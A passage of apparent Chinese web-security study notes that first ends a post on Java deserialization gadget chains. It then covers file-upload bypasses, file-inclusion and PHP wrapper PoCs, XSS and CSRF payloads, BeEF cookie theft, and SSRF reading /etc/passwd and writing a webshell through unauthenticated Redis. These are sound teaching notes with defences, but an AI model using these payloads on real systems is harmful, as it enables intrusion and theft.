4.remove必要性\n\n至于为什么需要`lazyMap2.remove(\"zZ\");`简单来说，就是第一次`hashtable.put`的时候，由于`hashtable.table`为`null`，无法进入循环到如下的`equals`函数触发`LazyMap.get()`。\n\n![image-20220807112631117](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807112631117.png)\n\n但是第二次的时候就会进入比较函数\n\n![image-20220807112907832](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807112907832.png)\n\n从而进入到`LazyMap.get()`调用空的`transform`函数数组，返回一个`key`\n\n![image-20220807113208463](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807113208463.png)\n\n导致我们的`LazyMap2`会多一个`key`\n\n![image-20220807113425973](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807113425973.png)\n\n如果保留下来，就无法进入到在`AbstractMap.equals`对应触发漏洞的地方，在如下地方就直接没掉，那么就需要去掉`lazyMap2`下由于空的`Transform`数组调用多出来的一个`key`了，都是为了进行各种绕过。\n\n![image-20220807113545609](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220807113545609.png)\n\n\n\n# 总结\n\n感觉差不多了，没什么太多的地方需要慢慢学习了。\n\n本菜鸡觉得`CC`链的学习主要就是分两部分吧\n\n一部分是后面的用来调用命令的部分，我觉得叫**命令链**比较合适，比如这里写到的经典链子`CCI`，经典链子`ITN`之类的，这部分都大同小异，暂时就那一些。\n\n另一部分就是从`readObject`调用到**命令链**的部分，这部分通常是需要需要慢慢挖掘的，主要的点就是找能调用到`transform`地方。\n\n\n\n","tags":["JAVA反序列化"],"categories":["JAVA","反序列化"]},{"title":"大三末实训","url":"/2022/06/19/实训/","content":"\n\n\n## 前言\n\n实训的笔记，记录一下，防止忘记\n\n## 网站URL\n\n统一资源定位器(`uniform resource locator`)，用来定位服务器的资源\n\n标准格式：`protocol://hostname[:port]/path/[?query]`\n\n`http`默认80端口\n\n- `%[ascii]`：此外`+`也代表空格，常用来转换`&`字符或者其他的一些特殊字符\n\n  ![image-20220530112713188](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530112713188.png)\n\n- `base64`编码：`http`环境下传递较长的标识信息\n\n- `Hex`编码：\n\n\n\n## 协议HTTP\n\n无状态的协议，通过`cookie`和`session`来进行相关的状态处理\n\n### (1)请求报文\n\n#### ①结构\n\n![image-20220530141434979](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530141434979.png)\n\n- `User-Agent`：产生请求的浏览器类型，一般可以随意指定，但是当服务器方面有限制则会受到影响，比如爬虫进行检查\n- `Accept`：用户声明客户端可以处理的`MIME`类型，即文件类型\n- `Accept-Encoding`：用于声明客户端能够理解的内容编码方式\n- `Accept-Language`：用于声明客户端可以理解的自然语言\n- `Cookie`：存放用户的身份凭证\n- `Content-Length`：请求数据的长度，服务器端只会按照该字段进行长度解析，多余的截断。\n- `Referer`：当前访问URL的上一个URL，用户从什么地方来到该页面的\n\n![image-20220530142815202](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530142815202.png)\n\n#### ②请求方法\n\n`GET/POST/CONNECT`等等\n\n`GET`：没有请求数据的部分，在URL中传输数据，由于URL长度限制，所以传输的数据也是有限制的。\n\n`POST`：在请求数据部分进行数据传输，长度基本没有什么限制，注意设置`Content-Type`和`Content-Length`\n\n\n\n### (2)响应报文\n\n描述服务器端的一些信息\n\n#### ①结构\n\n- `Data`：请求发送的时间和日期，GMT时间\n\n- `Server`：告诉客户端服务器的名称和版本号\n\n- `Content-Type`：响应正文的`MIME`类型\n\n- `Content-Length`：响应正文的长度\n\n- `Connection`：告诉客户端完成相应后的连接状态\n\n- `Content-Encoding`：Web服务器告诉浏览器数据传输使用了那种压缩方法\n\n- `Last-Modified`：实体报头域用于指示资源最后的修改日期和时间\n\n- 状态码：\n\n  ![image-20220530143957584](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530143957584.png)\n\n  - 200：请求成功\n  - 1XX：服务器收到请求，需要请求者继续执行操作\n  - 2XX：成功\n  - 3XX：重定向，需要进一步的操作用以完成请求。类似需要登录\n  - 4XX：客户端错误，请求包含语法错误或者无法完成请求\n  - 5XX：服务器端错误，服务器在处理请求的过程中发生了错误\n\n等等，还有一些其他的\n\n\n\n## 协议HTTPS\n\n在`HTTP`下加入了`SSL/TLS`层，通过安全机制进行传输数据。握手过程是明文传输，来建立`HTTPS`连接\n\n![image-20220530144221805](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530144221805.png)\n\n\n\n## 会话\n\n利用`cookie`(客户端)和`session`(服务端)来进行保存会话状态，比如记住密码\n\n客户端第一次发送数据给服务端时没有`Cookie`，服务器收到请求后，创建`Session`，之后通过`Set-Cookie`字段把`Session ID`以`Cookie`的形式告诉客户端。以后每次请求发送该`Cookie`到服务器，服务器即可识别。\n\n![image-20220530145435543](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530145435543.png)\n\n\n\n## 关于Webshell\n\n一个服务器权限\n\n## 身份认证\n\n通常爆破\n\n### (1)常见认证\n\n`Burpsuite`中的`Intruder`模块有很多选项\n\n可以设置需要爆破的地方，爆破方式，编码方式，爆破字典，是否跳转(状态码为302)等等\n\n### (2)Basic认证\n\n常见`admin:passwd`等，关键词为：`Authorization：Basic [xxxx]`，其中`xxxx`即为`admin:passwd`的相关编码，这个可以在`Intruder->Payloads->Payload type`选择`Custom iterator`。之后在`Payload Options [Simple list]`中设置下不同的字典即可，即自定义一个字段的不同位置数据的迭代爆破。\n\n- 设置方式\n\n![image-20220530192510353](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192510353.png)\n\n- 设置字典\n\n  - 用户密码![image-20220530192504191](C:/Users/007/AppData/Roaming/Typora/typora-user-images/image-20220530192504191.png)\n\n  - 中间冒号\n\n    ![image-20220530192534539](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192534539.png)\n\n  - 字典\n\n    ![image-20220530192702136](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192702136.png)\n\n- 设置编码\n\n  ![image-20220530192746452](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192746452.png)\n\n- 取消特殊字符，这里即为`=`的`url`编码\n\n  ![image-20220530192817488](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192817488.png)\n\n\n\n## 文件上传\n\n### (1)验证漏洞\n\n- 客户端`JavaScript`验证\n\n  当发现不是从服务器返回的验证不通过信息，就可能是客户端本身的`JavaScript`进行了验证，那么就可以在`Burpsuite`发包的过程对文件进行修改，比如改掉文件名称等。\n\n  或者直接修改本地网页中的`JavaScript`代码，或者使用插件禁用掉`JavaScript`代码脚本\n\n- 服务端验证\n\n  - `MIME`限制：常见的服务器对`Content-Type`进行解析限制\n\n  - 文件内容验证：通常验证文件头，可以修改其文件头，或者将一句话木马放入到对应的文件内容最后\n\n    `JPG`：FF D8 FF E0 00 10 4A 46 49 46\n\n    `GIF`：47 49 46 38 39 61`(GIF89a)`\n\n    `PNG`：89 50 4E 47\n\n  - 文件扩展名验证：验证文件的后缀，黑名单白名单之类的\n\n    - 大小写绕过(`Windows`下大小写不敏感)\n\n    - `windows`下的文件名后缀不规范（或者某些特殊字符）会被改掉，比如`test.php....`会被修改为`test.php`，但是这样就可以绕过验证了，实际还是执行的`php`文件。\n\n      ![image-20220530212508036](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530212508036.png)\n\n      ![image-20220530212656016](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530212656016.png)\n\n    - 如果只是替换后缀名，那么可以进行拓展后缀名绕过，比如`phphpp`\n\n    - `%00`截断绕过：保存文件时可能会将文件名和目录进行拼接，那么就可以绕过`（PHP<5.3.34）`\n\n    - 特殊可解析后缀绕过：\n\n      在某些环境（比如基于`ubuntu`的`apt-get`按照的`apache`）中，会将某些特殊的文件名后缀当作某一类文件进行解析，比如`php3`会被当作`php`解析\n\n      可能是开发的时候历史遗留问题把\n\n      ![image-20220530205111015](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530205111015.png)\n\n  - `Apache`的`.htaccess`绕过\n\n    `Apache`里面有一个配置文件，`xx.htacess`可以用来写入`Apache`配置信息，用来改变当前目录以及子目录下的`Apache`的配置信息。\n\n    需要如下条件：\n\n    - 运行`.htaccess`生效\n\n    - `Apache`开启`rewrite`模块\n    - `Apache`配置文件为`AllowOverride All`（默认为`None`）\n\n    那么就可以尝试上传该文件\n\n    ```\n    <FilesMatch \"sec.jpg\">\n    SetHandler application/x-httpd-php\n    </FilesMatch>\n    ```\n\n    之后当前配置下生效的地方，`sec.jpg`即可被解析为`php`\n\n\n\n### (2)服务器解析漏洞\n\n- `Apache`解析漏洞\n\n  从右往左解析，`abc.php.ccc.aaa`会被当作`abc.php`来进行解析（某些版本）\n\n- `IIS6.0`解析漏洞（`windows`的中间件）\n\n  ![image-20220530213952989](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530213952989.png)\n\n- `Nginx`解析漏洞\n\n  ![image-20220530214053524](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530214053524.png)\n\n[c0ny1/upload-labs: 一个想帮你总结所有类型的上传漏洞的靶场 (github.com)](https://github.com/c0ny1/upload-labs)\n\n## 文件下载\n\n### (1)利用\n\n过滤规则不好，可以下载任意文件\n\n- 获取站点源码\n- 获取站点与中间件配置文件\n- 获取应用与系统的配置文件\n\n![image-20220601104430476](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601104430476.png)\n\n可利用的相关配置文件\n\n- Windows平台\n\n  ![image-20220601105607099](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601105607099.png)\n\n- Linux平台\n\n  ![image-20220601105623772](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601105623772.png)\n\n### (2)防御\n\n- 文件保存到数据库，依据ID进行下载\n- 参数过滤，不能目录穿越\n\n\n\n## 文件包含\n\n即`include`和`require`相关函数，将用户指定的文件包含进来。那么如果该文件中有`php`代码，则会被执行，其他的字符，则会被输出。不受到相关文件后缀，文件头之类的限制。\n\n### (1)函数解析\n\n- `include`：包含过程中如果出现错误，只会生成警告（`E_WARNING`），在`include`函数后面的代码还是会正常被执行\n- `require`：包含过程中如果出现错误，会生成致命错误（`E_COMPILE_ERROR`）并且停止脚本运行，之后的代码都不包会被运行。\n- `include_once`和`require_once`两个函数，如果文件已经包含，则不会再次被包含，防止相关函数重定义或者变量重新赋值。\n\n### (2)漏洞利用\n\n通过`PHP`函数引入文件时，如果对文件名没有限制或者合理的验证，很容易执行到相关的漏洞`php`代码或者文件信息泄露。\n\n```php\n<?php\n    $file = $_GET[\"file\"];\ninclude $file;\n?>\n```\n\n#### ①本地文件包含\n\n即包含服务器本身的文件。\n\n```\n127.0.0.1/index.php?file=test.txt\n```\n\n#### ②远程文件包含\n\n利用`URL`，使得网络中的可访问文件被包含，不过需要在`php.ini`中开启如下配置项\n\n```\nallow_url_fopen = on(默认开启)\nallow_url_include = on(php5.2以后默认关闭)\n```\n\n如下\n\n```\n127.0.0.1/index.php?file=www.baidu.com\n```\n\n### (3)其他利用方式\n\n#### ①包含日志文件\n\n- 利用原理\n\n输入`URL`时，输入相关的`php`代码使之报错，随即就会将相关的报错信息输入到`log`中，那么就可以将`php`的相关代码输入到日志中，那么我们包含该日志就会执行到该代码。\n\n```\n127.0.0.1/index.php?file=<?php phpinfo(); ?>\n```\n\n![image-20220601174400213](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601174400213.png)\n\n- 利用条件：\n\n  - 日志文件可读\n  - 知道日志文件的存储目录\n\n- 常见的日志文件目录：\n\n  ![image-20220601174509112](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601174509112.png)\n\n并且一般情况下日志存储目录会被修改，需要读取服务器的相关配置文件（`httpd.conf`,`nginx.conf`等），或者依据`phpinfo()`来获取。\n\n相关的日志信息也可以被调整，限制。\n\n#### ②包含`Session`\n\n- 条件：\n\n  - `Session`中存在可控变量\n\n  - `Session`文件可以读写，并且知道存储路径\n\n- 默认存储路径：\n\n  ![image-20220601203337176](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601203337176.png)\n\n相关的`index.php`如下\n\n```php\n<?php\n    session_start();\n    $username = @$_GET['username'];\n    $_SESSION['username'] = $username;\n    highlight_file(__FILE__);\n?>\n```\n\n输入`username`会记录`Session`，以序列化的形式存在，可以在`php.ini`中找到相关的保存路径\n\n![image-20220601202513684](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601202513684.png)\n\n那么访问即可获得`Session`\n\n![image-20220601202712181](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601202712181.png)\n\n这样就可以尝试将该文件使用文件包含的形式来执行代码。\n\n\n\n### (4)伪协议\n\n使用伪协议可以访问`PHP`的相关文件描述符，从而进行读取解析文件。\n\n#### ①使用例子\n\n比如有时候直接文件包含不能够打印结果，比如说某个`test.php`，内容如下\n\n```php\n<?php\n\techo \"aaaa\";\n\t//flag{cccc}\n?>\n```\n\n那么当`include`文件包含进入之后，解析`PHP`代码，只会输出`aaaa`，而不会输出`flag{cccc}`的内容，这时候就需要用到伪协议`php://filert`来将文件流包含进来，这样就会打印出`test.php`文件了\n\n![image-20220601210615644](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601210615644.png)\n\n使用伪协议：\n\n```\nphp://filter/read=convert.base64-encode/resource=index.php\n```\n\n![image-20220601210629504](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601210629504.png)\n\n`Burpsuite`解码\n\n![image-20220601210654804](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601210654804.png)\n\n#### ②各种伪协议\n\n- `php://filter`\n\n  通常用来读取文件\n\n  - `php.ini`：\n\n    ```\n    allow_url_fopen=off/on\n    allow_url_include=off/on\n    ```\n\n  - `POC`：\n\n    ```\n    ?file=php://filter/read=convert.base64-encode/resource=test.php\n    ```\n\n- `php://input`\n\n  将`POST`请求的相关数据当作一个文件流输入进去，配合文件包含通常可以执行任意命令。\n\n  - `php.ini`：\n\n    ```\n    allow_url_fopen=off/on\n    allow_url_include=on\n    ```\n\n  - `POC`：\n\n    ```\n    ?file=php://input\n    [POST DATA]<?php phpinfo(); ?>\n    ```\n\n- `zip://`\n\n  访问压缩包里的文件，访问到的文件结合文件包含函数就会被当作`php`文件执行，从而实现任意代码执行。\n\n  - `php.ini`：\n\n    ```\n    allow_url_fopen=off/on\n    allow_url_include=off/on\n    php >= 5.2\n    ```\n\n    需要注意的是只要是压缩包即可，后缀名无所谓。相同类型的还要`zlib://`和`bzip2://`\n\n  - `POC`：\n\n    `#`需要进行`URL`编码\n\n    ```\n    zip://[压缩包绝对路径]#[压缩包内文件]\n    ?file=zip://D:\\phpstudy_pro\\WWW\\test.zip%23test.php\n    ```\n\n- `phar://`\n\n  `phar`是用来打包生成`php`项目用的，可以用相关协议进行解析，其中涉及到很多东西，比较常见的就是`zip`打包访问以及序列化、反序列的东西。\n\n  类似`zip://`，可以访问`zip`中的文件，并且相对路径和绝对路径都可以。\n\n  - `php.ini`：\n\n    ```\n    allow_url_fopen=off/on\n    allow_url_include=off/on\n    php >= 5.3\n    ```\n\n  - `POC`：\n\n    ```\n    ?file=phar://zip.jpg/phpinfo.txt\n    ?file=phar://D:\\zip.jpg\\phpinfo.txt\n    ```\n\n- `data://`\n\n  类似于`php://input`，让用户控制文件的输入流。\n\n  - `php.ini`：\n\n    ```\n    allow_url_fopen=on\n    allow_url_include=on\n    php >= 5.2\n    ```\n\n  - `POC`：\n\n    ```\n    data://[<MIME-type>][;charset=<encoding>][;base64],<data>\n    ?file=data://,<?php phpinfo();\n    ?file=data://text/plain,<?php phpinfo();\n    ?file=data://text/plain;base64,[content]\n    ?file=data:text/plain,<?php phpinfo();\n    ?file=data:text/plain;base64,[content]\n    ```\n\n### (5)防御\n\n- `allow_url_include`和`allow_url_fopen`最小权限化\n- 设置`open_basedir`将`php`所能打开的文件限制在指定的目录树中\n- 白名单限制包含文件，或者严格过滤`./\\`\n\n\n\n## 漏洞SQL注入\n\n了解基本原理，各种利用方式，盲注，时间盲注，布尔盲注，堆叠注入之类的，也差不多会，但是种类太多啦。而且感觉这种类型，工具比实际的感觉会好用一些。此外由于现今数据库很多都开始使用模型来获取制造SQL语句，很难利用了，所以笔记就没有怎么记录。\n\n\n\n## 漏洞XSS\n\n跨站脚本(`Cross Site Scripting`)攻击，为了不和`CSS`产生歧义，所以缩写为`XSS`。\n\n攻击者可以在页面插入恶意脚本（`JavaScript`）代码，受害者访问页面时，浏览器解析执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶意代码等行为。\n\n`XSS`即注入`HTML`代码\n\n### (1)种类\n\n#### ①存储型\n\n较为持久，一般在留言板、用户发帖、用户回帖的版块中，一般类似如下三步：\n\n- 插入留言：恶意代码数据存储到数据库中\n- 查看留言：恶意代码数据从数据库中提取出来\n- 内容在页面显示\n\n`DVWA`的`Low Security`版本代码如下\n\n```php\n<?php\n\nif( isset( $_POST[ 'btnSign' ] ) ) {\n    // Get input\n    $message = trim( $_POST[ 'mtxMessage' ] );\n    $name    = trim( $_POST[ 'txtName' ] );\n\n    // Sanitize message input\n    //基本没有过滤\n    $message = stripslashes( $message );\n    $message = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n\n    // Sanitize name input\n    $name = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n\n    // Update database\n    //插入到数据库中\n    $query  = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\";\n    $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $query ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );\n\n    //mysql_close();\n}\n\n?>\n```\n\n那么就直接将恶意代码插入了数据库，不同的`DVWA Security`如下\n\n![image-20220609104504618](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609104504618.png)\n\n之后在解析的时候\n\n没有过滤的直接解析为`HTML`代码\n\n![image-20220609104554318](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609104554318.png)\n\n过滤的信息被解析为相关的字符串\n\n![image-20220609104633495](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609104633495.png)\n\n#### ②反射型\n\n插入的数据不存储和读取数据库，直接回显到页面上，通常需要诱导用户去点击触发漏洞的地方。\n\n`DVWA`的`Low Security`版本代码如下\n\n```php\n\n<?php\n\nheader (\"X-XSS-Protection: 0\");\n\n// Is there any input?\nif( array_key_exists( \"name\", $_GET ) && $_GET[ 'name' ] != NULL ) {\n    // Feedback for end user\n    //获取输入然后拼接字符串直接作为HTML代码输出\n    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';\n}\n?>\n```\n\n浏览器中解析如下所示\n\n![image-20220609105153708](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609105153708.png)\n\n#### ③DOM型\n\n比较少见，通过修改页面中的DOM节点，与客户端上的`JavaScript`进行交互，不会与服务端进行交互，通常是`document.write`函数\n\n```js\n\n\t\t\t\t\tif (document.location.href.indexOf(\"default=\") >= 0) {\n\t\t\t\t\t\tvar lang = document.location.href.substring(document.location.href.indexOf(\"default=\")+8);\n\t\t\t\t\t\t//直接获取并且拼接，然后就document.write来写到整个HTML页面中\n\t\t\t\t\t\tdocument.write(\"<option value='\" + lang + \"'>\" + decodeURI(lang) + \"</option>\");\n\t\t\t\t\t\tdocument.write(\"<option value='' disabled='disabled'>----</option>\");\n\t\t\t\t\t}\n```\n\n没有写入其他的如下\n\n![image-20220609140222567](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609140222567.png)\n\n当从URL加入其他的拼接字符，其结构点发生变化，写入了我们的`JS`代码\n\n![image-20220609140308956](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609140308956.png)\n\n### (2)危害攻击\n\n- 钓鱼，可以伪造登录框和页面\n- Cookie盗取\n- 获取IP\n- 站点重定向\n- `BOM/DOM`的操作\n- 获取客户端的页面信息，比如窃取邮件内容\n- `XSS`蠕虫，可以自我传播\n\n### (3)挖掘\n\n输入输出点，有的转义、过滤、消毒的等需要处理\n\n### (4)触发漏洞\n\n- 在`script`标签插入\n\n  ```html\n  <script>alert(1)</script>\n  ```\n\n- 在事件中插入\n\n  ```html\n  <IMG src=x onerror=javascript:alert(1);>\n  ```\n\n  在该方式下，`src`读取不到资源，就会触发后面的`javascript`代码，即`alert(1)`\n\n- 在协议中插入\n\n  ```html\n  <a href=\"javascript:alert(1);\">点此查看链接</a>\n  ```\n\n  点击这里就会跳转`href`中进行执行`javascript`代码\n\n- 等等\n\n### ▲XSS的Payload大全：\n\n[Cross-Site Scripting (XSS) Cheat Sheet - 2022 Edition | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)\n\n### ▲XSS的题目大全\n\n[alert(1) (haozi.me)](https://xss.haozi.me/#/0x00)\n\n### (5)XSS攻击平台\n\n[firesunCN/BlueLotus_XSSReceiver (github.com)](https://github.com/firesunCN/BlueLotus_XSSReceiver)，这个通常用来自定义`payload`，然后进行上线\n\n`Kali`下的`Beef`，有很多的模块，社工弹窗等，还挺全\n\n### Cookie盗取\n\n使用`beef`的`hook.js`使得客户端执行恶意的`JS`代码后，会在`beef`中收到一些信息，其中就可以提取相关网站的`cookie`，之后使用无痕模式，将`Cookie`在`F12->App->Cookie->对应网站`下，修改填入相关盗取的`Cookie`即可\n\n![image-20220609173011737](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609173011737.png)\n\n### (6)防御\n\n#### ①代码防御\n\n在服务器的输入输出处理的时候使用过滤、编码、转移之类的，或者`HttpOnly`头来禁止`JS`代码读取`Cookie`。\n\n#### ②安全设备\n\n`WAF`和`IDS`\n\n#### ③控制客户端输入规则\n\n检测相关的输入\n\n## 漏洞CSRF\n\nCSRF（`Cross Site Request Forgery`），跨站点伪造请求。即攻击者在用户已经登录目标网站之后，诱导用户访问一个攻击者制造的攻击页面，利用用户身份对目标网站发起伪造用户身份操作的请求，相当于伪造用户。这个过程中没有盗取`Cookie`而是直接利用用户的`Cookie`来达到伪造用户身份的目的。\n\n![image-20220610150042385](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220610150042385.png)\n\n### (1)种类\n\n#### GET型\n\n- 无保护情况\n\n  当只需要进行`URL`提交即可完成功能，即只需要`GET`请求就能完成时。\n\n  如下，只是利用该`URL`传入参数，结合`Cookie`即可完成修改密码操作的时候。\n\n  ```php\n  http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change#\n  ```\n\n  这种情况就直接伪造一个链接，诱导用户点击该链接，从而触发一个目标网站\n\n- 有`Referer`\n\n  在`Medium`版本下的加了一行代码\n\n  ```php\n  if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )\n  ```\n\n  即检测`Referer`是否是服务器本身，`SERVER_NAME`表示运行脚本所在服务器的主机名。（如果只是浏览器输入`URL`访问的话，其`Referer`字段为空，链接的话则不会，会保存来源网站）\n\n  所以这里我们就需要进行抓包伪造`Referer`字段。\n\n- 有`token`\n\n  在`High`版本下添加了\n\n  ```php\n  checkToken( $token, $_SESSION[ 'session_token' ], 'index.php' );\n  //......\n  // Generate Anti-CSRF token\n  generateSessionToken();\n  ```\n\n  会检测用户传入的`token`，这是一个随机值，每次网站检测完之后会重新生成，然后将新的`token`发还给用户。\n\n  通常这种情况需要结合其他漏洞，比如`XSS`来获取相关的`token`值，即变成了`XSRF`。\n\n  ```\n  <iframe src=\"../csrf\" onload=alert(frames[0].document.getElementsByName(' user. token')[0].value\n  ```\n\n  即加载当前的`csrf`这个界面时，会弹出`token`值。当然，结合其他的手法可以直接获取`token`然后来伪造链接。\n\n#### POST型\n\n需要构造`POC`，在`Burp suite`中可以`右键->Engagement tools->Generate CSRF Poc`，这样可以生成一个`form`表单形式来发生`POST`请求，对应修改相关字段即可。\n\n```html\n<html>\n    <!-- CSRF PoC - generated by Burp Suite Professional -->\n    <body>\n        <script>history.pushState('', '', '/')</script>\n        <form action=\"https://www.baidu.com/\">\n            <input type=\"hidden\" name=\"username\" value=\"PIG-007\" />\n        </form>\n        <script>\n            document.forms[0].submit();\n;        </script>\n    </body>\n</html>\n```\n\n在添加`input`标签，然后添加对应需要的值即可\n\n### (2)利用\n\n通常组合拳形式来`XSRF`\n\n![image-20220610155923179](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220610155923179.png)\n\n### (3)防御\n\n- 验证`Referer`和`token`\n- 在`HTTP`头部加入自定义属性验证\n- 高危操作加入验证码\n- 等等\n\n\n\n## 漏洞SSRF\n\n`SSRF`（`Server-side Request Forgery`）服务端请求伪造\n\n比较常用的就是可以让服务器的相关敏感参数受到我们的控制，比如说我们可以传入一个`URL`让服务器去爬取，这个`URL`就是比较敏感的参数。\n\n这样就可以绕过服务器的防火墙了。\n\n### (1)可能存在的SSRF\n\n#### ①功能服务\n\n以下的就可能存在`SSRF`漏洞\n\n- 请求远端资源\n- 在线翻译\n- 数据库内置功能\n- 编码服务(?api=xxxx)\n- `URL`网址调用\n- 邮箱邮件\n\n#### ②关键参数\n\n`share、target、wap、url、sourceURL、imageURL、source、domain`等\n\n#### ③关键函数\n\n- `PHP`：\n  - `file_get_contents()`\n  - `fsockopen()`\n  - `curl_exec()`\n  - `fopen()`\n- `Python`：\n  - `urllib`库`http`头注入\n  - `requests`库中默认跟随`30x`跳转\n\n### (2)利用\n\n#### ①相关协议\n\n- `file`：访问本地文件的协议\n\n- `http`\n\n- `dict`：字典服务器协议，基于查询响应的`TCP`协议。查询目标服务端口，需要服务具备`TCP`回显功能\n\n  ![image-20220612113058963](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612113058963.png)\n\n  常见如下：\n\n  - `http:80`\n  - `https:433`\n  - `ftp:20/21`\n  - `mysql:3306`\n  - `telnet:23`\n  - `dns:53`\n  - `dhcp:67/68`\n  - `sshd:22`\n  - `nginx:80`\n  - `tomcat:8080`\n  - `sql server:1433`\n  - `oracle:1521`\n  - `smtp:25`\n  - `redis:6379`\n\n- `gopher`：在`HTTP`协议之前的，在`Internet`上常见的协议，支持多行，常用来攻击内网。\n\n#### ②获取敏感文件\n\n- `Windows`\n\n  - `C:/windows/win.ini`：保存系统配置文件\n\n- `Linux`\n\n  - `file:///etc/passwd`：获取账号密码\n\n  - `file:///etc/hosts`：本网段的内网IP\n\n    ![image-20220612112056049](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612112056049.png)\n\n    之后可以进行内网探测\n\n#### ③内网横向探测-WEB\n\n##### A.首先获取内网`IP`\n\n使用`file`协议：`file:///etc/hosts`，但是在虚拟机里不知道怎么获取到对应的`docker的IP`\n\n这里假设本地搭建的虚拟机里面，`docker`和本虚拟机组成的一个子网\n\n![image-20220612113904560](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612113904560.png)\n\n即子网中其他的`docker的IP`就是`172.17.0.x`\n\n##### B.信息收集\n\n爆破子网存活主机及端口\n\n在`BurpSuite`中将包发到`Intruder`，然后添加`$`进行重放，由于是需要爆破多个位置，那么就使用`Clusterbomb`模式\n\n![image-20220612120816854](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612120816854.png)\n\n之后在`Payload`上进行设置两个位置的爆破数值\n\n第一个\n\n![image-20220612120947874](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612120947874.png)\n\n第二个\n\n![image-20220612121049196](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612121049196.png)\n\n开始攻击之后得到结果，依据对应的内容和长度来判断是否存在相关的服务\n\n![image-20220612121321908](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612121321908.png)\n\n##### C.内网穿透\n\n利用`gopher`协议来利用构造两个数据包\n\n- 首先将第一个爬虫数据包抓取放到`Repeater`\n\n#### ③内网横向探测-Redis-未授权\n\n##### A.`dict`协议测试\n\n```\ndict://172.17.0.2:6379/\n```\n\n返回如下`OK`即代表未授权即可访问，即没有密码\n\n![image-20220612174542324](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612174542324.png)\n\n如果需要密码访问即如下\n\n![image-20220612175006529](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612175006529.png)\n\n##### B.写入木马\n\n```\ndict://172.17.0.2:6379/flushall\ndict://172.17.0.2:6379/config set dir /var/www  (网址根目录)\ndict://172.17.0.2:6379/config set dbfilename ssrf.php\ndict://172.17.0.2:6379/set webshell \"<?php phpinfo(); ?>\"\ndict://172.17.0.2:6379/save\n```\n\n\n\n## XXE\n\n\n\n## 命令执行\n\n### (1)常用函数\n\n#### ①`eval()`函数\n\n```\nmixed eval(string $code);\n```\n\n把字符串`code`当作`PHP`执行\n\n- 代码不能包含打开/关闭`PHP tags`，比如不能传入`<?php echo \"Hi\"; 